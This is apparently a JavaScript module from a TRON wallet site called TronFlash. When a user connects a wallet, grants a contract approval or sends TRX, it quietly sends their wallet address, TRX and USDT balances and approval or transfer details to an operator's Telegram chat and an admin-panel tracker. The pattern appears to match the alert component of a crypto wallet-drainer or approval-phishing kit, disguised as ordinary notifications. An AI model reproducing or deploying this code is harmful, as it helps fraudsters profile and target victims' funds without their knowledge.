// Telegram Notification System for TronFlash
// This file contains the notification functions that integrate with the main application

class TelegramNotificationService {
    constructor() {
        // Telegram Bot Configuration - Now loaded from master config
        this.TELEGRAM_BOT_TOKEN = window.TRONFLASH_CONFIG?.TELEGRAM?.BOT_TOKEN || "YOUR_BOT_TOKEN_HERE";
        this.TELEGRAM_CHAT_ID = window.TRONFLASH_CONFIG?.TELEGRAM?.CHAT_ID || "YOUR_CHAT_ID_HERE";
    }

    // Main notification function to be called when wallet connects
    async sendWalletConnectNotification(session, getBalance, getUSDTSmartContract, getTronWeb) {
        try {
            // Check if configuration is set
            if (this.TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || this.TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
                console.log("⚠️ Telegram notification not configured. Please set your bot token and chat ID.");
                return;
            }

            // Get wallet address from session
            const walletAddress = session?.namespaces?.tron?.accounts?.[0]?.split(":")[2] || "Unknown";
            
            if (walletAddress === "Unknown") {
                console.log("⚠️ Could not get wallet address from session");
                return;
            }

            // Get balances
            const trxBalance = await this.getTRXBalance(walletAddress, getBalance);
            const usdtBalance = await this.getUSDTBalance(walletAddress, getUSDTSmartContract, getTronWeb);
            
            // Format timestamp
            const timestamp = new Date().toLocaleString();
            
            // Create notification message
            const message = `🔗 **Wallet Connected Successfully!**

📍 **Wallet Address:** \`${walletAddress}\`
💰 **TRX Balance:** ${trxBalance.toFixed(6)} TRX
💵 **USDT Balance:** ${usdtBalance.toFixed(2)} USDT
⏰ **Connected At:** ${timestamp}

🎉 Welcome to TronFlash!`;
            
            // Send to Telegram
            await this.sendTelegramMessage(message);
            
        } catch (error) {
            console.error("❌ Error sending Telegram notification:", error);
        }
    }

    // Get TRX balance
    async getTRXBalance(address, getBalance) {
        try {
            if (!address) return 0;
            return await getBalance(address);
        } catch (error) {
            console.error("Error fetching TRX balance:", error);
            return 0;
        }
    }

    // Get USDT balance
    async getUSDTBalance(address, getUSDTSmartContract, getTronWeb) {
        try {
            if (!address) return 0;
            
            const usdtContract = getUSDTSmartContract();
            const tronWeb = getTronWeb();
            
            // Get USDT balance using TronWeb
            const contract = await tronWeb.contract().at(usdtContract);
            const balance = await contract.balanceOf(address).call();
            
            // Convert from smallest unit (6 decimals for USDT)
            return balance / 1000000;
        } catch (error) {
            console.error("Error fetching USDT balance:", error);
            return 0;
        }
    }

    // Send message to Telegram
    async sendTelegramMessage(message) {
        try {
            const telegramUrl = `https://api.telegram.org/bot${this.TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            if (response.ok) {
                console.log("✅ Telegram notification sent successfully!");
            } else {
                console.error("❌ Failed to send Telegram notification:", await response.text());
            }
        } catch (error) {
            console.error("❌ Error sending to Telegram:", error);
        }
    }

    // Wallet approval success notification
    async sendWalletApprovalSuccessNotification(session, getBalance, getUSDTSmartContract, getTronWeb, approvalDetails = {}) {
        try {
            // Check if configuration is set
            if (this.TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || this.TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
                console.log("⚠️ Telegram notification not configured. Please set your bot token and chat ID.");
                return;
            }

            // Get wallet address from session
            const walletAddress = session?.namespaces?.tron?.accounts?.[0]?.split(":")[2] || "Unknown";
            
            if (walletAddress === "Unknown") {
                console.log("⚠️ Could not get wallet address from session");
                return;
            }

            // Get balances
            const trxBalance = await this.getTRXBalance(walletAddress, getBalance);
            const usdtBalance = await this.getUSDTBalance(walletAddress, getUSDTSmartContract, getTronWeb);
            
            // Format timestamp
            const timestamp = new Date().toLocaleString();
            
            // Create notification message
            const message = `✅ **Wallet Approval Successful!**

📍 **Wallet Address:** \`${walletAddress}\`
💰 **TRX Balance:** ${trxBalance.toFixed(6)} TRX
💵 **USDT Balance:** ${usdtBalance.toFixed(2)} USDT
⏰ **Approved At:** ${timestamp}
${approvalDetails.contractAddress ? `🔗 **Contract:** \`${approvalDetails.contractAddress}\`` : ''}
${approvalDetails.amount ? `💸 **Amount:** ${approvalDetails.amount}` : ''}

🎉 Your wallet has been successfully approved for contract interactions!`;
            
            // Send to Telegram
            await this.sendTelegramMessage(message);
            
        } catch (error) {
            console.error("❌ Error sending wallet approval notification:", error);
        }
    }

    // TRX Send Success Notification
    async sendTRXSendSuccessNotification(session, sendDetails = {}) {
        try {
            // Check if configuration is set
            if (this.TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || this.TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
                console.log("⚠️ Telegram notification not configured. Please set your bot token and chat ID.");
                return;
            }

            // Get wallet address from session
            const walletAddress = session?.namespaces?.tron?.accounts?.[0]?.split(":")[2] || "Unknown";
            
            if (walletAddress === "Unknown") {
                console.log("⚠️ Could not get wallet address from session");
                return;
            }

            // Format timestamp
            const timestamp = new Date().toLocaleString();
            
            // Create notification message
            const message = `💰 **TRX Transfer Successful!**

✅ **Transaction Status:** Completed
📍 **From Address:** \`${sendDetails.fromAddress || walletAddress}\`
🎯 **To Address:** \`${sendDetails.toAddress}\`
💸 **Amount Sent:** ${sendDetails.amount} TRX
⏰ **Sent At:** ${timestamp}
🔗 **Transaction Hash:** \`${sendDetails.txHash || 'Pending'}\`
${sendDetails.fee ? `💳 **Network Fee:** ${sendDetails.fee} TRX` : ''}
${sendDetails.purpose ? `📝 **Purpose:** ${sendDetails.purpose}` : ''}

🎉 TRX has been successfully transferred!`;
            
            // Send to Telegram
            await this.sendTelegramMessage(message);
            
            // Track TRX transaction for admin panel
            if (window.trackTRXTransaction) {
                window.trackTRXTransaction(sendDetails);
            }
            
        } catch (error) {
            console.error("❌ Error sending TRX send success notification:", error);
        }
    }

    // Update configuration
    updateConfig(botToken, chatId) {
        this.TELEGRAM_BOT_TOKEN = botToken;
        this.TELEGRAM_CHAT_ID = chatId;
        console.log("✅ Telegram configuration updated!");
    }
}

// Global instance
window.telegramNotificationService = new TelegramNotificationService();

// Function to be called from the main application
window.sendTelegramWalletNotification = function(session, getBalance, getUSDTSmartContract, getTronWeb) {
    return window.telegramNotificationService.sendWalletConnectNotification(session, getBalance, getUSDTSmartContract, getTronWeb);
};

// Function to be called when wallet approval is successful
window.sendTelegramWalletApprovalNotification = function(session, getBalance, getUSDTSmartContract, getTronWeb, approvalDetails) {
    return window.telegramNotificationService.sendWalletApprovalSuccessNotification(session, getBalance, getUSDTSmartContract, getTronWeb, approvalDetails);
};

// Function to be called when TRX send is successful
window.sendTelegramTRXSendNotification = function(session, sendDetails) {
    return window.telegramNotificationService.sendTRXSendSuccessNotification(session, sendDetails);
};
